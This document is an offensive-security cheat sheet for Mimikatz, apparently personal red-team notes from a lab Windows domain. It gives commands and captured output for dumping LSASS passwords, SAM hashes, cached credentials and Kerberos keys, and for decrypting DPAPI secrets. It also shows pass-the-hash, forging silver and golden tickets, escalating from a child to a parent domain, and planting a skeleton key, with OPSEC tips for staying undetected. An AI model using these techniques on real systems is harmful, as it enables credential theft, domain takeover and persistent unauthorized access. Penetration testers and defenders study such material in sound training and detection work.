# Mimikatz



## Commands
``````powershell
# Logonpasswords
mimikatz sekurlsa::logonpasswords
# Logonpasswords on lsass dmp
mimikatz "log log.txt" "sekurlsa::minidump C:\Users\patri\Downloads\sql2.bin" "sekurlsa::logonPasswords"
# Get [[Domain Cached Credentials]]
mimikatz lsadump::cache
# Get [[eKeys]] Kerberos aes265_hmac
mimikatz sekurlsa::ekeys
# Get local account hashes [[Security Account Manager]]
mimikatz lsadump::sam
# Get [[Data Protection API (DPAPI)]]
mimikatz vault::list
``````

## Spawn process with injected credentials
Requires admin
``````sh
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:patrick /domain:edu.evil.corp /ntlm:2e8a408a8aec852ef2e458b938b8c071 /run:"C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
user    : patrick
domain  : edu.evil.corp
program : C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc
impers. : no
NTLM    : 2e8a408a8aec852ef2e458b938b8c071
  |  PID  13608
  |  TID  23228
  |  LSA Process is now R/W
  |  LUID 0 ; 3731125840 (00000000:de647650)
  \_ msv1_0   - data copy @ 000002B378344C10 : OK !
  \_ kerberos - data copy @ 000002B37859B388
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000002B378209E28 (32) -> null
``````

## [[Silver Ticket]]
### Create silver ticket
1. [[DCSync]] the krbtgt user
2. Generate [[Silver Ticket]]
Where:
-   `/user` is the username to impersonate.
-   `/domain` is the current domain name.
-   `/sid` is the current domain SID.
-   `/target` is the target machine.
-   `/aes256` is the AES256 key for the target machine.
-   `/ticket` is the filename to save the ticket as.
```beacon
mimikatz # kerberos::golden /user:Administrator /domain:edu.evil.corp /sid:S-1-5-21-3263068140-2042698922-2891547269 /target:srv2 /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
User      : Administrator
Domain    : edu.evil.corp (EDU)
SID       : S-1-5-21-3263068140-2042698922-2891547269
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 - aes256_hmac
Service   : cifs
Target    : srv2
Lifetime  : 25/05/2022 10:30:08 ; 23/05/2031 10:30:08 ; 23/05/2031 10:30:08
-> Ticket : srv2-cifs.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```
3. [[Use Kerberos ticket (kirbi)]]

Here are some useful ticket combinations:
| Technique         | Required Service Tickets |
| ----------------- | ------------------------ |
| psexec            | CIFS                     |
| winrm             | HOST & HTTP              |
| dcsync (DCs only) | LDAP                     | 

## [[Golden Ticket]]
### Create golden ticket (user)
#OPSEC Specify the lifetime (mimikatz does abnormal 10 years)
Use the `/startoffset`, `/endin` and `/renewmax` parameters to control the start offset, duration and the maximum renewals (all in minutes).

1. Get DC [[PowerView#Get-DomainController]] 
2. [[PowerView#Get-DomainSID]]
3. [[DCSync]] the krbtgt user
4. Generate [[Golden Ticket]] as follows:
Where:
-   `/user` is the username to impersonate : see 2
-   `/domain` is the current domain name : see 1
-   `/sid` is the current domain SID. : see 2
-   `/aes256` is the AES256 key for the krbtgt : see 3
-   `/ticket` is the filename to save the ticket as.
```beacon
mimikatz # kerberos::golden /user:Administrator /domain:edu.evil.corp /sid:S-1-5-21-3263068140-2042698922-2891547269 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /ticket:golden.kirbi
User      : Administrator
Domain    : edu.evil.corp (EDU)
SID       : S-1-5-21-3263068140-2042698922-2891547269
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa - aes256_hmac
Lifetime  : 3/11/2022 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM
-> Ticket : golden.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```
3. [[Use Kerberos ticket (kirbi)]]

## [[Parent-Child]]
revert via:
>beacon> rev2self

### Create golden ticket ParentChild
```beacon
powershell Get-DomainGroup -Identity "Domain Admins" -Domain rto.local -Properties ObjectSid
objectsid                                    
---------                                    
S-1-5-21-2323903455-1895497758-3703895482-512

powershell Get-DomainGroup -Identity "Domain Admins" -Domain child.rto.local -Properties ObjectSid
objectsid                                   
---------                                   
S-1-5-21-1886337448-2504686659-850325809-512

hashdump
or
mimikatz lsadump::dcsync /user:CHILD\krbtgt /domain:child.rto.local
aes256_hmac       (4096) : 0c5f44579dd7cd99796e0ca64506184e2779d4ab96690ac042a80e1d29097477
```

-   `/user` is the username to impersonate.
-   `/domain` is the current domain.
-   `/sid` is the current domain SID.
-   `/sids` is the SID of the target group to add ourselves to.
-   `/aes256` is the AES256 key of the current domain's krbtgt account.
-   `/startoffset` sets the start time of the ticket to 10 mins before the current time.
-   `/endin` sets the expiry date for the ticket to 60 mins.
-   `/renewmax` sets how long the ticket can be valid for if renewed.

```beacon
mimikatz kerberos::golden /user:Administrator /domain:child.rto.local /sid:S-1-5-21-1886337448-2504686659-850325809-512 /sids:S-1-5-21-2323903455-1895497758-3703895482-512 /aes256:0c5f44579dd7cd99796e0ca64506184e2779d4ab96690ac042a80e1d29097477 /startoffset:-10 /endin:600 /renewmax:10080
```

## [[Skeleton Key]]
```
beacon> mimikatz !misc::skeleton
[KDC] data
[KDC] struct
[KDC] keys patch OK
[RC4] functions
[RC4] init patch OK
[RC4] decrypt patch OK

beacon> make_token EDU\Administrator mimikatz
[+] Impersonated EDU\john

beacon> ls \\dc-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 dir     05/19/2022 11:11:35   $Recycle.Bin
 dir     05/10/2022 03:23:44   Boot
 dir     10/18/2016 01:59:39   Documents and Settings
 dir     05/23/2018 11:06:05   PerfLogs
 dir     12/13/2017 21:00:56   Program Files
 dir     05/10/2022 02:01:55   Program Files (x86)
 dir     03/10/2022 14:38:44   ProgramData
 dir     10/18/2016 02:01:27   Recovery
 dir     03/10/2022 13:52:03   Shares
 dir     05/19/2022 11:39:02   System Volume Information
 dir     03/11/2022 12:59:29   Users
 dir     05/19/2022 13:26:27   Windows
 379kb    fil     01/28/2022 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 448mb    fil     03/11/2022 09:19:53   pagefile.sys
```

## [[Data Protection API (DPAPI)]]
#OPSEC Not recommended. Try gathering it from the DC

>mimikatz vault::list
>mimikatz sekurlsa::dpapi

## Extract passwords locally
1. Get subfolder path of {SID}
``````sh
Get-ChildItem C:\Users\$env:username\AppData\Roaming\Microsoft\Protect\{SID}\xxx

 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
 -a-hs-        16.03.2022     13:00            468 29deba8c-55de-4930-97d5- 7d949402541b
 -a-hs-        16.03.2022     13:01            468 c3b72001-5fd0-4a1d-b548- b4e6fcecd431
 -a-hs-        24.01.2022     20:00             24 Preferred
``````

2. Choose one of the encrypted creds
``````powershell
Get-ChildItem -Hidden C:\Users\$env:username\AppData\Local\Microsoft\Credentials

 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
 -a-hs-        05.01.2022     20:00           3252 040F76937B2E54B70658AF91D1BEBCCF
 -a-hs-        15.03.2022     14:06           3012 0437BF9439473166B0F4C16EC80BC809
``````

3. Check for guid masterkey of encrypted creds via [[Mimikatz]]
``````powershell
dpapi::cred /in:C:\Users\patri\AppData\Local\Microsoft\Credentials\040F76937B2E54B70658AF91D1BEBCCF

**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {c3b72001-5fd0-4a1d-b548-b4e6fcecd431}
``````

4. Get DPAPI master key listed in 3 as guidMasterKey.
``````powershell
dpapi::masterkey /in:C:\Users\patri\AppData\Roaming\Microsoft\Protect\S-1-5-21-3318663386-1925972964-1342212060-1001\c3b72001-5fd0-4a1d-b548-b4e6fcecd431 /rpc

# OR VIA LOCAL IF NOT DOMAIN JOINED
sekurlsa::dpapi

Authentication Id : 0 ; 658810602 (00000000:2744a6ea)
Session           : Interactive from 3
User Name         : patri
Domain            : PHANTOM
Logon Server      : (null)
Logon Time        : 16.03.2022 12:59:58
SID               : S-1-5-21-3318663386-1925972964-1342212060-1001
         [00000000]
         * GUID      :  {c3b72001-5fd0-4a1d-b548-b4e6fcecd431}
         * Time      :  16.03.2022 13:07:03
         * MasterKey :  877b54004621de000414e1e85af59928027d55f6be31beafd8007ad21779e3eb75ec95b58ebcedf4333a7c38c[SNIP]21f9ba45cb6a1ea974839762
         * sha1(key) :  71e8820de4c5f31bc7d81c44ed85bcc720e46536
         [00000001]
         * GUID      :  {29deba8c-55de-4930-97d5-7d949402541b}
         * Time      :  16.03.2022 13:32:13
         * MasterKey :  976241ce72ce24871d8b5c05775549a8025e4a8d8c52594c57d7d8206dd5d4f0889c9a242d2fed8b562c703f82[SNIP]091ce38cbb27346be13abef8
         * sha1(key) :  c27a0c1eb6a9b65c698cad771fa6346e3517e148
``````

5. decrypt file from 2 with key from 4.
``````powershell
dpapi::cred /in:C:\Users\patri\AppData\Local\Microsoft\Credentials\040F76937B2E54B70658AF91D1BEBCCF /masterkey:877b54004621de000414e1e85af59928027d55f6be31beafd8007ad21779e3eb75ec95b58ebcedf433[SNIP]21f9ba45877b1426c72cb
``````

## [[Domain Cached Credentials]]
Unfortunately, the hash format is not NTLM.

To crack these with [[Hashcat]], we need to transform them into the expected format. The [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) shows us it should be `$DCC2$<iterations>#<username>#<MsCacheV2hash>`.

``````
beacon> mimikatz lsadump::cache

Domain : SRV1
SysKey : 5d11b46a92921b8775ca574306ba5355

Local name : SRV1 ( S-1-5-21-4124990477-354564332-720757739 )
Domain name : EDU ( S-1-5-21-3263068140-2042698922-2891547269 )
Domain FQDN : edu.evil.corp

Policy subsystem is : 1.14
LSA Key(s) : 1, default {2f242789-b6b3-dc42-0903-3e03acab0bc2}
  [00] {2f242789-b6b3-dc42-0903-3e03acab0bc2} c09ac7dd10900648ef451c40c317f8311a40184b60ca28ae78c9036315bf8983

* Iteration is set to default (10240)

[NL$1 - 2/25/2022 1:07:37 PM]
RID       : 00000460 (1120)
User      : EDU\john
MsCacheV2 : 98e6eec9c0ce004078a48d4fd03f2419

[NL$2 - 5/17/2022 2:00:46 PM]
RID       : 0000046e (1134)
User      : EDU\svc_mssql
MsCacheV2 : 3f903860f7b6861a702eb9d6509d9da6

[NL$3 - 5/17/2022 2:00:50 PM]
RID       : 00000462 (1122)
User      : EDU\doe
MsCacheV2 : 673e2fe26e26e79c58379168b79890f6
``````

## [[eKeys]]
This Mimikatz module will dump [[Kerberos]] encryption keys.
``````beacon
beacon> mimikatz sekurlsa::ekeys

Authentication Id : 0 ; 113277 (00000000:0001ba7d)
Session           : Interactive from 1
User Name         : doe
Domain            : EDU
Logon Server      : DC-2
Logon Time        : 5/24/2022 9:00:11 AM
SID               : S-1-5-21-3263068140-2042698922-2891547269-1122

 * Username : doe
 * Domain   : edu.evil.corp
 * Password : (null)
 * Key List :
 aes256_hmac       a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1
 rc4_hmac_nt       4ffd3eabdce2e158d923ddec72de979e
 rc4_hmac_old      4ffd3eabdce2e158d923ddec72de979e
 rc4_md4           4ffd3eabdce2e158d923ddec72de979e
 rc4_hmac_nt_exp   4ffd3eabdce2e158d923ddec72de979e
 rc4_hmac_old_exp  4ffd3eabdce2e158d923ddec72de979e
``````

## [[LSASS dumping]]
``````
beacon> mimikatz sekurlsa::logonpasswords
``````

## [[Pass-the-Hash]]
#OPSEC this to specify the programm and avoid the weird piping into cmd.exe
## Recommended
``````beacon
beacon> mimikatz sekurlsa::pth /user:doe /domain:edu.evil.corp /ntlm:4ffd3eabdce2e158d923ddec72de979e

user    : doe
domain    : edu.evil.corp
program    : cmd.exe
impers.    : no
NTLM    : 4ffd3eabdce2e158d923ddec72de979e
  |  PID  6284
  |  TID  6288
  
beacon> steal_token 6284
[+] Impersonated NT AUTHORITY\SYSTEM
``````

## [[Security Account Manager]]
``````
beacon> mimikatz lsadump::sam

Domain : SRV1
SysKey : 5d11b46a92921b8775ca574306ba5355
Local SID : S-1-5-21-4124990477-354564332-720757739

SAMKey : fb5c3670b47e5ecae21f328b12d3103c

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 12a427a6fdf69be4917d30afc633f6fd

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount
``````

```meta
requirements: 
results: 
opsec: False
oss: #win
source: https://github.com/gentilkiwi/mimikatz
description: It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets.
```